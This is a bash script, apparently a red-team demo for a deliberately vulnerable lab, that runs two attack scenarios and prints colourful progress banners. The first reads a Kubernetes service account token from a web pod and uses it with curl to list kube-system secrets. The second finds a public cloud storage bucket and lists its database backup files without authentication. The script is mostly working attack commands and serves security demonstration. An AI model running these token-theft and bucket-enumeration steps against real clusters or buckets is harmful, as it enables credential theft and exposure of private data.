#!/bin/bash

# --- Color Variables ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}======================================================${NC}"
echo -e "${RED}   INITIATING AUTOMATED ATTACK SIMULATION (RED TEAM)  ${NC}"
echo -e "${BLUE}======================================================${NC}"
echo ""

# -----------------------------------------------------------------
# ATTACK 1: The Kubernetes Lateral Movement
# -----------------------------------------------------------------
echo -e "${YELLOW}[*] SCENARIO 1: Exploiting frontend RCE to compromise the Kubernetes Cluster...${NC}"
sleep 2

echo -e "${YELLOW}[*] Locating vulnerable Tasky web pod...${NC}"
POD_NAME=$(kubectl get pods -l app=wiz-webapp -o jsonpath='{.items[0].metadata.name}' 2>/dev/null)

if [ -z "$POD_NAME" ]; then
    echo -e "${RED}[!] Error: Could not find the wiz-webapp pod. Check your K8s context.${NC}"
else
    echo -e "${GREEN}[+] Target acquired: ${POD_NAME}${NC}"
    sleep 2

    echo -e "${YELLOW}[*] Simulating attacker extracting Service Account token from inside the pod...${NC}"
    # Extract the token silently
    TOKEN=$(kubectl exec $POD_NAME -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)
    TOKEN_PREVIEW=$(echo $TOKEN | head -c 30)
    echo -e "${GREEN}[+] Token compromised: ${TOKEN_PREVIEW}...[TRUNCATED]${NC}"
    sleep 2

    echo -e "${YELLOW}[*] Using compromised token to query the Kubernetes API for kube-system secrets...${NC}"
    echo -e "${RED}[!] BLAST RADIUS UNLOCKED: Listing protected cluster secrets!${NC}"
    sleep 2
    
    # Get the internal API server address
    API_SERVER=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')
    
    # Hit the API from the local machine using the stolen token (bypasses missing 'curl' in the pod)
    curl -s -k -H "Authorization: Bearer $TOKEN" $API_SERVER/api/v1/namespaces/kube-system/secrets | grep '"name":' | head -n 5
    echo -e "${GREEN}[+] Cluster compromise successful.${NC}"
fi

echo ""
echo -e "${BLUE}------------------------------------------------------${NC}"
echo ""

# -----------------------------------------------------------------
# ATTACK 2: The Public Bucket Exfiltration
# -----------------------------------------------------------------
echo -e "${YELLOW}[*] SCENARIO 2: Anonymous data exfiltration from misconfigured Cloud Storage...${NC}"
sleep 2

echo -e "${YELLOW}[*] Locating public backup bucket...${NC}"
# Dynamically find the bucket using gcloud instead of terraform paths
BUCKET_NAME=$(gcloud storage ls 2>/dev/null | grep 'wiz-db-backups' | sed 's|gs://||g' | sed 's|/||g' | head -n 1)

if [ -z "$BUCKET_NAME" ]; then
    echo -e "${RED}[!] Error: Could not retrieve bucket name automatically. Enter it manually:${NC}"
    read BUCKET_NAME
else
    echo -e "${GREEN}[+] Target Bucket: ${BUCKET_NAME}${NC}"
fi
sleep 2

echo -e "${YELLOW}[*] Simulating unauthenticated internet scan of the bucket URL...${NC}"
sleep 2

# An unauthenticated curl command to prove public read access
HTTP_STATUS=$(curl -o /dev/null -s -w "%{http_code}\n" https://storage.googleapis.com/$BUCKET_NAME/)

if [ "$HTTP_STATUS" -eq 200 ]; then
    echo -e "${RED}[!] BUCKET IS PUBLICLY READABLE (HTTP 200 OK)!${NC}"
    sleep 2
    echo -e "${YELLOW}[*] Exfiltrating database backup directory listings...${NC}"
    
    # Extract just the object names from the XML response to make it look clean
    curl -s "https://storage.googleapis.com/$BUCKET_NAME/" | grep -o "<Key>[^<]*</Key>" | sed 's/<\/\?Key>//g' | head -n 5
    
    echo -e "${GREEN}[+] Data exfiltration successful.${NC}"
else
    echo -e "${GREEN}[+] Bucket is secure. HTTP Status: ${HTTP_STATUS}${NC}"
fi

echo ""
echo -e "${BLUE}======================================================${NC}"
echo -e "${RED}             SIMULATION COMPLETE                      ${NC}"
echo -e "${BLUE}======================================================${NC}"
